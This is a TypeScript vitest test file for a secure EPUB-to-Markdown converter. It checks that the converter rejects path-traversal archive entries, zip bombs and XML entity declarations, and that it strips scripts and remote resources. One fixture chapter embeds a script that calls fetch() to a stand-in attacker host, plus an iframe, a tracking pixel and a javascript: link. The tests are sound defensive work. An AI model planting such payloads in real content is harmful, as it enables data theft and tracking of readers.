import { describe, expect, it } from 'vitest'
import { strFromU8, strToU8, unzipSync, zipSync } from 'fflate'
import { openSecureArchive } from '../core/archive'
import { convertEpub } from '../core/convert'
import { SecurityError } from '../core/errors'
import { resolveArchiveReference, validateArchiveEntryName } from '../core/path'
import { parseXmlSecure } from '../core/xml'
import { makeEpub } from './fixtures'

describe('archive path hardening', () => {
  it.each(['../evil.txt', '/absolute.txt', 'C:/windows.txt', 'safe\\evil.txt', 'a//b.txt'])(
    'rejects unsafe entry %s',
    (path) => expect(() => validateArchiveEntryName(path)).toThrow(SecurityError),
  )

  it('resolves a legal parent reference without escaping the archive', () => {
    expect(resolveArchiveReference('OEBPS/Text', '../Images/cover.png')).toBe('OEBPS/Images/cover.png')
  })

  it('rejects a reference that escapes the archive root', () => {
    expect(() => resolveArchiveReference('OEBPS', '../../outside')).toThrow(SecurityError)
  })

  it('rejects case-insensitive duplicate archive names', () => {
    const archive = zipSync({ 'Text/A.txt': strToU8('a'), 'text/a.txt': strToU8('b') })
    expect(() => openSecureArchive(archive)).toThrow(/doppelte Dateipfade/u)
  })

  it('rejects extreme compression ratios before extraction', () => {
    const archive = zipSync({ bomb: new Uint8Array(500_000) }, { level: 9 })
    expect(() => openSecureArchive(archive)).toThrow(/verdächtig stark komprimiert/u)
  })
})

describe('XML hardening', () => {
  it('rejects DTD and entity declarations', () => {
    const xml = strToU8('<!DOCTYPE x [<!ENTITY boom "boom">]><x>&boom;</x>')
    expect(() => parseXmlSecure(xml, 'Test-XML')).toThrow(/DTD- oder Entity/u)
  })
})

describe('secure EPUB conversion', () => {
  it('converts a normal EPUB into a Markdown bundle', () => {
    const result = convertEpub(makeEpub(), 'test.epub')
    const output = unzipSync(result.archive)
    const book = strFromU8(output['book.md']!)

    expect(book).toContain('# Sicheres Testbuch')
    expect(book).toContain('![Cover](assets/001-cover.png)')
    expect(Object.keys(output)).toContain('chapters/001-Kapitel Eins.md')
    expect(Object.keys(output)).toContain('SECURITY-REPORT.md')
  })

  it('removes active elements, remote resources and unsafe links', () => {
    const maliciousChapter = `<!doctype html><html><body>
      <h1>Kapitel</h1>
      <script>fetch('https://attacker.invalid/steal')</script>
      <iframe src="https://attacker.invalid/frame"></iframe>
      <p><a href="javascript:alert(1)">Nicht klicken</a></p>
      <img src="https://attacker.invalid/pixel" alt="Tracker" />
      <p>Text mit https://attacker.invalid/plain</p>
    </body></html>`
    const result = convertEpub(makeEpub({ chapter: maliciousChapter }), 'dubios.epub')
    const book = strFromU8(unzipSync(result.archive)['book.md']!)

    expect(book).toContain('Nicht klicken')
    expect(book).toContain('[externe URL entfernt]')
    expect(book).not.toMatch(/<script|<iframe|javascript:|attacker\.invalid/iu)
    expect(result.summary.warnings.length).toBeGreaterThan(0)
  })

  it('rejects entity declarations inside XHTML chapters', () => {
    const chapter = '<!DOCTYPE html [<!ENTITY x "boom">]><html><body><p>&x;</p></body></html>'
    expect(() => convertEpub(makeEpub({ chapter }), 'entity.epub')).toThrow(/DTD- oder Entity/u)
  })
})
